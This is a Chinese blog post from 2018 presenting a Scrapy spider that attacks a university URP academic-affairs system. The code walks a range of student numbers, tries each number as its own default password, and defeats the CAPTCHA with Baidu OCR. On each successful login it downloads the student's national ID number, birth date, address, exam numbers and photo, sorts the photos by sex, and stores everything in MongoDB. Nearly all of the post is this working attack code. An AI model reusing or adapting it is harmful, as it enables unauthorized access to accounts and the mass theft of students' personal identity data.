---
layout:     post
title:      "【Hacker之梦】Scrapy框架爬取URP教务系统"
subtitle:   ""
date:       2018-10-31 18:38:17
author:     "ShawnD"
header-img: "img/post-bg-rwd.jpg"
tags:
    - 爬虫
    - Hacker
---


![](https://upload-images.jianshu.io/upload_images/8332901-98f8e52580c86fbf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


本来这个月上旬就该写完这篇文章的，奈何各种事情太多，一拖再拖，眼看就到下个月了，想到今天无论如何也得把这篇文章写完。
再者就是，因为教务系统马上就要改版，该文章的一部分内容其实已经不适用了，但是其中思路还是可以分享出来和大家共享的。

### 准备工作

### scrapy框架初了解
- Spider
具体的爬虫程序，基本上整个爬虫逻辑都是在这里实现的
- Items
要从网页上爬取哪些元素，也就是你需要的目标信息
- Piplines
在这里对Items进行数据清洗，并保存在数据库或者保存为其他形式
- middlewaves
中间件，对于一些有反扒措施的网站(比如封IP或者封Cookie), 就需要在这里搭建IP池，或者Cookie池

### 登陆

- 模拟登陆请求

1. 首先初始化所需要的变量(开始学号，终止学号等)
```
    StartSchoolNumber = input('Please enter the start SchoolNumber:')
    EndSchoolNumber = input('Please enter the end SchoolNumber:')
    count = int(StartSchoolNumber)
    username = '0'
    password = '0'
    v_code = 1
    #v_code是验证码
```

2. 判断学号是否满足条件，并请求验证码
```
    def start_requests(self):
        if self.count >= int(self.StartSchoolNumber) and self.count <= int(self.EndSchoolNumber) :
            j = str(self.count)
            if j[9] > '0' and j[10] <= '5' and j[9] < '4':
                self.username = str(j)
                self.password = str(j)
            yield Request('http://xx.xx.xx.xx/validateCodeAction.do',
                          callback=self.start_login, meta={'cookiejar':1}, errback=self.start_requests)
```

3. 破解验证码
在验证码这里，选择使用了百度OCR，一方面是因为自己使用百度AI比较多，相对了解一些。另一方面，百度OCR，相对于其他OCR给的免费次数也多一些(每天有50000次的免费api调用次数，在晚上开始爬虫，一共100000次)。
**在这里要注意，不要在很短时间内多次请求api，否则会被认为产生了并发，延迟在0.5s左右。**
```
from aip import AipOcr

""" 读取图片 """
def get_file_content(filePath):
    with open(filePath, 'rb') as fp:
        return fp.read()

def Get_CheckCode(path):
    """ 你的 APPID AK SK """
    APP_ID = 'xxx'
    API_KEY = 'xxx'
    SECRET_KEY = 'xxx'
    try:
        client = AipOcr(APP_ID, API_KEY, SECRET_KEY)
        image = get_file_content(path)
        """ 调用通用文字识别, 图片参数为本地图片 """
        result1 = client.basicGeneral(image);
        if len(result1['words_result']) != 0:
            result = result1['words_result'][0]['words']
            result = result.replace(' ', '', 4)
            print(result)
            return result
        else:
            return '0000'
    except:
        return 1

```

4. 发送登陆请求
```
    def start_login(self, response):
        with open(r'C:\URPspider\test.jpg', 'wb') as f:
            f.write(response.body)
        self.v_code = 1
        while(self.v_code==1):
            #在这里调用OCR
            self.v_code = Get_CheckCode(r'C:\URPspider\test.jpg')
        self.logger.info(self.v_code)
        yield FormRequest('http://xx.xx.xx.xx/loginAction.do',
                      method='POST',
                      meta={'cookiejar': response.meta['cookiejar']},
                      formdata={
                          'zjh': self.username,
                          'mm': self.password,
                          'v_yzm': self.v_code,
                      },
                      callback=self.parse_Secret,
                      dont_filter=True,
                      errback=self.start_requests)
```
5. 解析登陆请求返回的网页，并判断登陆状态
```
    def parse_Secret(self, response):
        html = response.text
        soup = BeautifulSoup(html, 'html.parser')
        error = soup.find('title')
        error = error.get_text().strip()
        if (error == '学分制综合教务'):
            self.logger.info('密码正确')
            yield Request('http://xx.xx.xx.xx/xjInfoAction.do?oper=xjxx',
                          meta={'cookiejar': response.meta['cookiejar']},
                          callback=self.parse_Info,
                          dont_filter=True,
                          errback=self.start_requests)

        if (error == 'URP 综合教务系统 - 登录'):
            self.logger.info('验证码错误')
            yield Request('http://xx.xx.xx.xx/validateCodeAction.do', 
                            callback=self.start_login, meta={'cookiejar': 1}, dont_filter=True, errback=self.start_requests)


        if (error == '错误信息'):
            self.logger.info('密码错误')
            self.count += 1
            if self.count >= int(self.StartSchoolNumber) and self.count <= int(self.EndSchoolNumber):
                j = str(self.count)
                if(j[9] > '0' and j[10] <= '5' and j[9] < '4'):
                    self.username = str(j)
                    self.password = str(j)
                    self.logger.info(self.username)
                    yield Request('http://xx.xx.xx.xx/validateCodeAction.do',
                               callback=self.start_login, meta={'cookiejar': 1}, dont_filter=True, errback=self.start_requests)
                else:
                    while(j[6] != '5' or j[7] != '0' or j[8] > '8' or j[8] < '1' or j[9] <= '0' or j[10] > '5' or j[9] >= '4'):
                        self.count += 1
                        j = str(self.count)
                        self.logger.info(self.username)
                    if (j[9] > '0' and j[10] <= '5' and j[9] < '4'):
                        self.username = str(j)
                        self.password = str(j)
                        self.logger.info(self.username)
                        yield Request('http://xx.xx.xx.xx/validateCodeAction.do', callback=self.start_login,
                                      meta={'cookiejar': 1}, dont_filter=True, errback=self.start_requests)
```
解析这里我们使用了beautifulsoup库，当然大家也可以采用lmxl或者css这样的选择器。
<title>定义的标题是整个网页的标题，只在浏览器顶部的tab栏里显示，在网页中不显示，是写给搜索引擎看。
通过观察我们发现，在登陆过程中检测这一标签便可知道登陆状态。

**注意以下这一部分代码是用来滤掉不符合要求的学号，减少计算时间:**
```
            self.count += 1
            if self.count >= int(self.StartSchoolNumber) and self.count <= int(self.EndSchoolNumber):
                j = str(self.count)
                if(j[9] > '0' and j[10] <= '5' and j[9] < '4'):
                    self.username = str(j)
                    self.password = str(j)
                    self.logger.info(self.username)
                    yield Request('http://xx.xx.xx.xx/validateCodeAction.do',
                               callback=self.start_login, meta={'cookiejar': 1}, dont_filter=True, errback=self.start_requests)
                else:
                    while(j[6] != '5' or j[7] != '0' or j[8] > '8' or j[8] < '1' or j[9] <= '0' or j[10] > '5' or j[9] >= '4'):
                        self.count += 1
                        j = str(self.count)
                        self.logger.info(self.username)
                    if (j[9] > '0' and j[10] <= '5' and j[9] < '4'):
                        self.username = str(j)
                        self.password = str(j)
                        self.logger.info(self.username)
                        yield Request('http://xx.xx.xx.xx/validateCodeAction.do', callback=self.start_login,
                                      meta={'cookiejar': 1}, dont_filter=True, errback=self.start_requests)
```

### 爬取信息
```
    def parse_Info(self,response):
        soup = BeautifulSoup(response.text, 'html.parser')
        titles1 = soup.find_all('td', 'fieldName')
        titles2 = soup.find_all('td', align="left")
        name = soup.find_all('td', width='275')
        self.name = name[1].get_text().strip()

        if len(titles1) >= len(titles2):
            max = len(titles1)
        else:
            max = len(titles2)
        dict = {}
        for i in range(0, max):
            dict[titles1[i].get_text().strip()] = 'xxxx'
            if (i >= 3):
                dict[titles1[i].get_text().strip()] = titles2[i - 3].string.strip()
        dict['姓名:'] = self.name
        dict['学号:'] = self.username
        self.dict = dict
        yield Request('http://xx.xx.xx.xx/xjInfoAction.do?oper=img',
                      meta={'cookiejar': response.meta['cookiejar']},
                      callback=self.parse_Photo,
                      dont_filter=True,
                      errback=self.start_requests)
```
通过解析网页就可以得到我们想要的信息

### 爬取照片并登入下一账号
```
     def parse_Photo(self,response)
        info_item = URPItem(SchoolNumber=self.dict['学号:'],
                            Name=self.dict['姓名:'],
                            Sex=self.dict['性别:'],
                            IDCard=self.dict['身份证号:'],
                            Category=self.dict['学生类别:'],
                            Status=self.dict['学籍状态:'],
                            Nation=self.dict['民族:'],
                            Birthplace=self.dict['籍贯:'],
                            BirthData=self.dict['出生日期:'],
                            PoliticalStatus=self.dict['政治面貌:'],
                            AdmissionNumber=self.dict['录取号:'],
                            ExaminationNumber=self.dict['高考考生号:'],
                            MailAddress=self.dict['通讯地址:'],
                            ZipCode=self.dict['邮编:'],
                            EntryData=self.dict['入学日期:'],
                            College=self.dict['系所:'],
                            Profession=self.dict['专业:'])
        self.logger.info(info_item)
        path = os.getcwd()
        pathBoy = path + '\\PhotoBoy'
        pathGirl = path + '\\PhotoGirl'

        if (self.dict['性别:'] == "男"):
            if os.path.exists(pathBoy):
                string = pathBoy + '\\' + self.username + '_' + self.name + '.jpg'
                fp = open(string, 'wb')
                print(self.dict["性别:"])
                fp.write(response.body)
                fp.close()
            else:
                os.mkdir(pathBoy)
                string = pathBoy + '\\' + self.username + '_' + self.name + '.jpg'
                fp = open(string, 'wb')
                print(self.dict["性别:"])
                fp.write(response.body)
                fp.close()
        if (self.dict['性别:'] == "女"):
            if os.path.exists(pathGirl):
                string = pathGirl + '\\' + self.username + '_' + self.name + '.jpg'
                fp = open(string, 'wb')
                print(self.dict["性别:"])
                fp.write(response.body)
                fp.close()
            else:
                os.mkdir(pathGirl)
                string = pathGirl + '\\' + self.username + '_' + self.name + '.jpg'
                fp = open(string, 'wb')
                print(self.dict["性别:"])
                fp.write(response.body)
                fp.close()
        yield info_item
        self.count += 1
        if self.count >= int(self.StartSchoolNumber) and self.count <= int(self.EndSchoolNumber):
            j = str(self.count)
            if (j[9] > '0' and j[10] <= '5' and j[9] < '4'):
                self.username = str(j)
                self.password = str(j)
                self.logger.info(self.username)

                yield Request('http://xx.xx.xx.xx/validateCodeAction.do', 
                              callback=self.start_login, meta={'cookiejar': 1}, dont_filter=True, errback=self.start_requests)
            else:
                while (j[6] != '5' or j[7] != '0' or j[8] > '8' or j[8] < '1' or j[9] <= '0' or j[10] > '5' or j[9] >= '4'):
                    self.count += 1
                    j = str(self.count)
                    self.logger.info(self.username)
                if (j[8] > j[9] > '0' and j[10] <= '5' and j[9] < '4'):
                    self.username = str(j)
                    self.password = str(j)
                    self.logger.info(self.username)
                    yield Request('http://xx.xx.xx.xx/validateCodeAction.do', callback=self.start_login,
                                  meta={'cookiejar': 1}, dont_filter=True, errback=self.start_requests)
```
注意，这里默认爬下来的照片是.do文件，直接把后缀改成jpg就可以打开。
因为保存照片是最后一步的解析，也就是所有信息都爬取完毕了，所以需要进行下一账号的登陆。
**Scrapy有趣的地方就在于每个方法都必须返回一个可迭代对象，层层连接，感觉思路非常清晰。做完这一步下一步干什么，从返回的可迭代对象的回调函数就可以看出。**

### 将数据保存在数据库中
数据都已经爬取到了，接下来就应该存储下来了。在Pipelines中将items写入MongoDB，其实就是死老路，执行写入操作就好，MongoDB具体用法可参考[MongoDB数据库的基本概念及操作](https://www.jianshu.com/p/6609dc55a379)。
下面附上代码：
```
import json
from scrapy.exceptions import DropItem

import pymongo

class MongoPipeline(object):

    def __init__(self, mongo_uri, mongo_db):
        self.mongo_uri = mongo_uri
        self.mongo_db = mongo_db

    @classmethod
    def from_crawler(cls, crawler):
        return cls(
            mongo_uri=crawler.settings.get('MONGO_URI'),
            mongo_db=crawler.settings.get('MONGO_DATABASE')
        )

    def open_spider(self, spider):
        self.client = pymongo.MongoClient(self.mongo_uri)
        self.db = self.client[self.mongo_db]

    def close_spider(self, spider):
        self.client.close()

    def process_item(self, item, spider):
        self.db['user'].update({'SchoolNumber': item['SchoolNumber']},
                               {'$set': item},
                               True)
        return item
```

**写的比较仓促，很多细节也没有写到，让大家见笑了**
